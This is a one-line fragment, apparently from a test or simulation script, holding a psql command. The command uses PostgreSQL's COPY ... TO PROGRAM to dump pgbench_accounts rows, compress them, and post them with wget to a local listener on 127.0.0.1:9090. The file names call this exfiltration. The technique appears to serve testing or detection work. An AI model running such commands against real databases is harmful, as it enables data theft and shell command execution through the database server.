...
psql -U postgres -d casce_tpcb -c "$(casce_sql_prelude)COPY (SELECT * FROM pgbench_accounts LIMIT 10) TO PROGRAM 'bzip2 > /tmp/exfil_bzip2_wget.dat && wget -q --post-file=/tmp/exfil_bzip2_wget.dat http://127.0.0.1:9090 2>/dev/null || true';"
